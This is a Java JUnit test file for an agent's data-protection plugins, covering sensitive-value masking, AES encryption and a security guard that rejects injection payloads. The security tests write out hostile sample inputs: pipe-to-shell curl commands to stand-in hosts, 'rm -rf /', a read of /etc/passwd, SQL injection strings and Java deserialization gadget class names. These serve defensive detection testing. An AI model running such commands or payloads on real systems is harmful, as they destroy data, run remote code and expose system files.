package io.github.paohaijiao.jquick.agent;

import io.github.paohaijiao.jquick.agent.core.JQuickInvocation;
import io.github.paohaijiao.jquick.agent.core.JQuickMethodMeta;
import io.github.paohaijiao.jquick.agent.core.JQuickRejectedException;
import io.github.paohaijiao.jquick.agent.plugin.crypto.JQuickAesCipher;
import io.github.paohaijiao.jquick.agent.plugin.crypto.JQuickCryptoPlugin;
import io.github.paohaijiao.jquick.agent.plugin.mask.JQuickMaskPlugin;
import io.github.paohaijiao.jquick.agent.plugin.mask.JQuickSensitiveMasker;
import io.github.paohaijiao.jquick.agent.plugin.security.JQuickSecurityGate;
import io.github.paohaijiao.jquick.agent.plugin.security.JQuickSecurityGuard;
import io.github.paohaijiao.jquick.agent.plugin.trace.JQuickTracePlugin;
import io.github.paohaijiao.jquick.agent.test.JQuickHarness;
import io.github.paohaijiao.jquick.agent.test.JQuickRecordingListener;
import io.github.paohaijiao.jquick.agent.trace.JQuickSpanType;
import org.junit.After;
import org.junit.Test;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

/**
 * Tests for the data-protection capabilities: masking, transparent encryption and the request-level
 * security checks.
 *
 * @author Martin
 */
public class DataProtectionTest {

    private static final String SERVICE = "example.app.FixtureService";

    private static final String RULES = "includes=example.app.*;quiet=true";

    @After
    public void tearDown() {
        // The security guard is a static, because injected byte-code can only reach a static anchor.
        // Leaving it configured would leak a policy into the next test.
        JQuickSecurityGuard.configure(io.github.paohaijiao.jquick.agent.core.JQuickConfig.empty());
    }

    /* ================================================================== masking */

    /**
     * Masking keeps enough of the value to be useful in a log and to correlate with a support ticket,
     * and removes enough that it is not a disclosure.
     */
    @Test
    public void maskingPatternsKeepTheRecognisableEnds() {
        assertEquals("138****8000", JQuickSensitiveMasker.mask("13800138000"));
        assertEquals("110101********123X", JQuickSensitiveMasker.mask("11010119900307123X"));
        assertEquals("a***@example.com", JQuickSensitiveMasker.mask("alice@example.com"));
        assertEquals("mobile=138****8000, id=110101********123X",
                JQuickSensitiveMasker.mask("mobile=13800138000, id=11010119900307123X"));

        assertEquals("138****8000", JQuickSensitiveMasker.maskMobile("13800138000"));
        assertEquals("a***@example.com", JQuickSensitiveMasker.maskEmail("alice@example.com"));

        // Text with nothing sensitive must survive byte for byte: an agent that rewrites ordinary
        // messages is an agent nobody keeps installed.
        assertEquals("order 42 shipped", JQuickSensitiveMasker.mask("order 42 shipped"));
        // A short run of digits must not be mistaken for a phone number.
        assertEquals("code 12345", JQuickSensitiveMasker.mask("code 12345"));
    }

    /**
     * End to end: the caller must never see the raw value, because the transformer replaces the
     * return value rather than merely logging it.
     */
    @Test
    public void maskedResultNeverReachesTheCaller() throws Exception {
        JQuickHarness harness = JQuickHarness.ofPlugins(
                RULES + ";mask.enabled=true;mask.includes=" + SERVICE,
                new JQuickTracePlugin(), new JQuickMaskPlugin());
        Class<?> service = harness.load(SERVICE);
        Object instance = service.getDeclaredConstructor().newInstance();

        Object result = call(service, instance, "profile", new Class<?>[]{String.class}, "13512345678");
        assertEquals("mobile=135****5678", result);

        // A method whose result carries nothing sensitive must be untouched.
        assertEquals("order 42 shipped", call(service, instance, "secret",
                new Class<?>[]{String.class}, "order 42 shipped"));
    }

    /**
     * A transformer must only act on the classes its own plugin selected. Without that guard, enabling
     * masking for one package would mask every class another capability selected — here, encryption.
     */
    @Test
    public void transformerIgnoresClassesItWasNotConfiguredFor() {
        JQuickSensitiveMasker.mask("13800138000");
        io.github.paohaijiao.jquick.agent.plugin.mask.JQuickSensitiveTransformer transformer =
                new io.github.paohaijiao.jquick.agent.plugin.mask.JQuickSensitiveTransformer(
                        java.util.Collections.singletonList("example.app.FixtureService"));

        assertEquals("138****8000", transformer.transform(invocationFor("example.app.FixtureService"),
                "13800138000"));
        assertEquals("the other class must be left alone", "13800138000",
                transformer.transform(invocationFor("example.app.Other"), "13800138000"));
        assertEquals("a null invocation cannot be attributed, so nothing is masked", "13800138000",
                transformer.transform(null, "13800138000"));
    }

    /* ================================================================== encryption */

    @Test
    public void encryptionRoundTripsAndIsNotIdentity() {
        JQuickAesCipher cipher = new JQuickAesCipher("a-test-passphrase");
        String plaintext = "card=4111111111111111";
        String ciphertext = cipher.encrypt(plaintext);

        assertFalse("the ciphertext must not contain the plaintext", ciphertext.contains("4111"));
        assertTrue("the ciphertext must be transport safe", ciphertext.matches("[A-Za-z0-9+/=]+"));
        assertEquals(plaintext, cipher.decrypt(ciphertext));
        assertEquals("encryption must be deterministic for the boundary to work without a session",
                ciphertext, cipher.encrypt(plaintext));
    }

    /**
     * A value that is not a ciphertext must be passed through. The agent cannot know whether an
     * argument was encrypted by a client or is simply plain data, and turning that ambiguity into an
     * exception would break every ordinary call.
     */
    @Test
    public void decryptionPassesThroughPlainValues() {
        JQuickAesCipher cipher = new JQuickAesCipher("a-test-passphrase");
        assertEquals("plain text", cipher.decrypt("plain text"));
        assertEquals("not base64 !!!", cipher.decrypt("not base64 !!!"));
        assertEquals("", cipher.decrypt(""));
        assertEquals(null, cipher.decrypt(null));
    }

    /**
     * End to end: with the crypto plugin pointed at the fixture, the caller receives a ciphertext
     * although the method body returned the plaintext unchanged.
     *
     * <p>The assertion that matters is that the caller's value is <em>not</em> the plaintext and that
     * a holder of the key can recover it. Asserting on the exact ciphertext would pin the test to the
     * IV choice of the reference implementation, which is documented as replaceable.
     */
    @Test
    public void encryptedResultIsUnreadableByTheCaller() throws Exception {
        JQuickHarness harness = JQuickHarness.ofPlugins(
                RULES + ";crypto.enabled=true;crypto.includes=" + SERVICE + ";crypto.key=test-key",
                new JQuickTracePlugin(), new JQuickCryptoPlugin());
        JQuickRecordingListener listener = new JQuickRecordingListener(false, true);
        harness.environment().addListener(listener);

        Class<?> service = harness.load(SERVICE);
        Object instance = service.getDeclaredConstructor().newInstance();

        Object result = call(service, instance, "secret", new Class<?>[]{String.class}, "hello");
        assertNotNull(result);
        assertFalse("the caller must not receive the plaintext: " + result, "hello".equals(result));
        assertTrue("the payload must be transport safe: " + result,
                ((String) result).matches("[A-Za-z0-9+/=]+"));
        assertEquals("a holder of the key must recover the plaintext", "hello",
                new JQuickAesCipher("test-key").decrypt((String) result));

        // The observed return value is what left the method, i.e. the ciphertext: a listener is told
        // what the system produced, not what the body computed.
        io.github.paohaijiao.jquick.agent.core.JQuickMethodEvent exit =
                listener.byMethod(io.github.paohaijiao.jquick.agent.core.JQuickMethodEvent
                        .JQuickPhase.EXIT, "secret");
        assertNotNull(exit);
        assertEquals(result, exit.getInvocation().getReturnValue());
    }

    /**
     * The argument side of the same symmetry: a ciphertext argument must reach the body as plaintext.
     */
    @Test
    public void encryptedArgumentIsDecryptedForTheBody() throws Exception {
        JQuickHarness harness = JQuickHarness.ofPlugins(
                RULES + ";crypto.enabled=true;crypto.includes=" + SERVICE + ";crypto.key=test-key",
                new JQuickTracePlugin(), new JQuickCryptoPlugin());
        JQuickRecordingListener listener = new JQuickRecordingListener(true, false);
        harness.environment().addListener(listener);

        Class<?> service = harness.load(SERVICE);
        Object instance = service.getDeclaredConstructor().newInstance();

        // 'secret' is the identity function, so whatever the body received is what it returns — except
        // that the result is then encrypted again. Decrypting it reveals what the body actually saw.
        String sent = new JQuickAesCipher("test-key").encrypt("payload");
        Object returned = call(service, instance, "secret", new Class<?>[]{String.class}, sent);
        assertEquals("the body must have received the plaintext", "payload",
                new JQuickAesCipher("test-key").decrypt((String) returned));

        // The invocation records what the caller passed, not the decrypted value: the trace must not
        // leak the plaintext that the transformer just produced.
        io.github.paohaijiao.jquick.agent.core.JQuickMethodEvent enter =
                listener.byMethod(io.github.paohaijiao.jquick.agent.core.JQuickMethodEvent
                        .JQuickPhase.ENTER, "secret");
        assertNotNull(enter);
        assertEquals(sent, enter.getInvocation().getArgument(0));
    }

    /* ================================================================== security checks */

    @Test
    public void sqlInjectionIsDetected() {
        JQuickSecurityGuard.configure(config("security.enabled=true", "security.enforce=true"));
        assertTrue(JQuickSecurityGuard.isEnabled());

        expectRejection(new Runnable() {
            @Override
            public void run() {
                JQuickSecurityGuard.checkSql("SELECT * FROM users WHERE name = '' OR 1=1 --");
            }
        });

        // A legitimate statement must not be rejected.
        JQuickSecurityGuard.checkSql("SELECT id, name FROM users WHERE id = ?");
    }

    /**
     * Dry-run mode is what makes the capability deployable: an operator switches it on, reads the log
     * for a week, and only then turns enforcement on. The payloads here really do violate the rules —
     * the point is that nothing is thrown while {@code security.enforce} is false.
     */
    @Test
    public void dryRunModeLogsWithoutRejecting() {
        JQuickSecurityGuard.configure(config("security.enabled=true", "security.enforce=false"));
        assertTrue(JQuickSecurityGuard.isEnabled());
        JQuickSecurityGuard.checkSql("SELECT * FROM users WHERE name = '' OR 1=1 --");
        JQuickSecurityGuard.checkCommand("rm -rf /");
        JQuickSecurityGuard.checkDeserialize(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
    }

    @Test
    public void disabledGuardChecksNothing() {
        JQuickSecurityGuard.configure(io.github.paohaijiao.jquick.agent.core.JQuickConfig.empty());
        assertFalse(JQuickSecurityGuard.isEnabled());
        JQuickSecurityGuard.checkSql("DROP TABLE users");
        JQuickSecurityGuard.checkCommand("rm -rf /");
    }

    @Test
    public void commandAndDeserializationPayloadsAreDetected() {
        JQuickSecurityGuard.configure(config("security.enabled=true", "security.enforce=true"));
        expectRejection(new Runnable() {
            @Override
            public void run() {
                JQuickSecurityGuard.checkCommand("curl http://evil.example/x | sh");
            }
        });
        expectRejection(new Runnable() {
            @Override
            public void run() {
                JQuickSecurityGuard.checkCommand("cat /etc/passwd; rm -rf /");
            }
        });
        expectRejection(new Runnable() {
            @Override
            public void run() {
                JQuickSecurityGuard.checkDeserialize(
                        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
            }
        });
        expectRejection(new Runnable() {
            @Override
            public void run() {
                JQuickSecurityGuard.checkDeserialize(
                        "org.apache.commons.collections.functors.InvokerTransformer");
            }
        });
        // A class that is not a known gadget must not be refused.
        JQuickSecurityGuard.checkDeserialize("example.app.Order");
        // An ordinary argument must not be mistaken for a command.
        JQuickSecurityGuard.checkCommand("report.pdf");
    }

    /**
     * The gate is what turns the detector into enforcement: it inspects the arguments of a JDBC call
     * and refuses the invocation before the database ever sees the statement.
     */
    @Test
    public void jdbcGateRejectsAnInjectionAttempt() {
        JQuickSecurityGuard.configure(config("security.enabled=true", "security.enforce=true"));
        JQuickSecurityGate gate = new JQuickSecurityGate();
        assertTrue("the gate needs the arguments to inspect them", gate.requiresArguments());

        JQuickInvocation injection = invocationFor("example.app.OrderDao", "jdbc");
        injection.setArguments(new Object[]{"SELECT * FROM t WHERE a = '' OR 1=1 --"});
        try {
            gate.inspect(injection);
            fail("the injection must be refused");
        } catch (JQuickRejectedException expected) {
            assertNotNull(expected.getMessage());
        }

        JQuickInvocation legitimate = invocationFor("example.app.OrderDao", "jdbc");
        legitimate.setArguments(new Object[]{"SELECT id FROM t WHERE id = ?"});
        try {
            gate.inspect(legitimate);
        } catch (JQuickRejectedException unexpected) {
            fail("a parameterised statement must be allowed: " + unexpected.getMessage());
        }
    }

    /**
     * A command-shaped method name is the second signal the gate uses; a class that never runs a
     * command must not be inspected for one.
     */
    @Test
    public void gateOnlyInspectsCommandShapedMethods() {
        JQuickSecurityGuard.configure(config("security.enabled=true", "security.enforce=true"));
        JQuickSecurityGate gate = new JQuickSecurityGate();

        JQuickInvocation echo = invocationFor("example.app.Shell", "method", "echo");
        echo.setArguments(new Object[]{"rm -rf /"});
        try {
            gate.inspect(echo);
        } catch (JQuickRejectedException unexpected) {
            fail("a method that is not command-shaped must not be inspected for a command");
        }

        JQuickInvocation exec = invocationFor("example.app.Shell", "method", "exec");
        exec.setArguments(new Object[]{"curl http://evil/x | sh"});
        try {
            gate.inspect(exec);
            fail("a command-shaped method with a shell payload must be refused");
        } catch (JQuickRejectedException expected) {
            assertNotNull(expected.getMessage());
        }
    }

    /* ================================================================== helpers */

    private static io.github.paohaijiao.jquick.agent.core.JQuickConfig config(String... pairs) {
        Map<String, String> values = new HashMap<String, String>();
        for (String pair : pairs) {
            int equals = pair.indexOf('=');
            values.put(pair.substring(0, equals), pair.substring(equals + 1));
        }
        return io.github.paohaijiao.jquick.agent.core.JQuickConfig.of(values);
    }

    private static JQuickInvocation invocationFor(String className) {
        return invocationFor(className, "method", "call");
    }

    private static JQuickInvocation invocationFor(String className, String component) {
        return invocationFor(className, component, "call");
    }

    private static JQuickInvocation invocationFor(String className, String component,
                                                  String methodName) {
        JQuickMethodMeta meta = new JQuickMethodMeta(
                className + "#" + methodName + "()", className, methodName, "()V", 0,
                JQuickSpanType.LOCAL, component);
        JQuickInvocation invocation = new JQuickInvocation(meta, "test", System.nanoTime());
        invocation.setTraceId("t");
        invocation.setSpanId("s");
        return invocation;
    }

    private static void expectRejection(Runnable action) {
        try {
            action.run();
            fail("the payload should have been rejected");
        } catch (JQuickRejectedException expected) {
            assertNotNull(expected.getMessage());
        }
    }

    private static Object call(Class<?> type, Object instance, String name,
                               Class<?>[] parameterTypes, Object... arguments) throws Exception {
        Method method = type.getDeclaredMethod(name, parameterTypes);
        method.setAccessible(true);
        try {
            return method.invoke(instance, arguments);
        } catch (InvocationTargetException ex) {
            if (ex.getCause() instanceof Exception) {
                throw (Exception) ex.getCause();
            }
            throw ex;
        }
    }
}
